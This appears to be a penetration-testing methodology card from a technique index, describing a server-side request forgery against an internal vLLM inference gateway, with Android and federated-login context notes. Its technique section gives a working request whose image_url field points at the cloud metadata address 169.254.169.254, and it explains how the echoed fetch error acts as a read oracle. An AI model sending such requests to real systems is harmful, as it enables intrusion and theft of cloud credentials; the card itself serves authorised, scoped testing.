# The primitive — android / federated

- source canon: `holyshit-mode/vllm-gateway-internal-fleet-ssrf.md`
- base technique: `holyshit-mode-vllm-gateway-internal-fleet-ssrf-the-primitive.md`
- bindings: **MASTG-RES** · **CWE-494** · **ATT&CK T1601**
- context: **android** · auth **federated** · chain role **pivot**

## Context

- platform: the check often lives client-side — frida/objection at the runtime, MASTG methodology
- auth state: identity rides an external IdP (OAuth/OIDC/SAML/SSO): the differential is the TOKEN — audience, issuer, redirect_uri, scope downgrades, code/state reuse, and the exchange at the resource server; the local session may be fine while the trust boundary is not

## The technique

```
POST https://<internal-gateway>/invocations
{"model":"deepseek-v4-flash",
 "messages":[{"role":"user","content":[
   {"type":"image_url","image_url":{"url":"http://169.254.169.254/latest/meta-data/"}}]}]}
```
→ `422 {"error":{"message":"Failed to fetch media from URL: HTTP 404 error (parameter=image_url,
value=http://169.254.169.254/latest/meta-data/)"}}`
The `HTTP 404 error` is the **server-side fetch result echoed back** — your read oracle.

## Probe adjustment (android × federated)

1. baseline first: the request/session with NOTHING changed
2. attack: the documented class probe, adjusted per context above
3. diff: measurable only — status/length/body — or it is not a finding

## Chain roles

- combines with a prior finding — chain detect pairs same-origin findings
- pairs-with: see `skilltree-index.md` for the sibling techniques

## Walls

- validation-only · NO-GAIN · documented-class adaptation only
- in-scope only: the scope authority refuses everything else (rc=1)
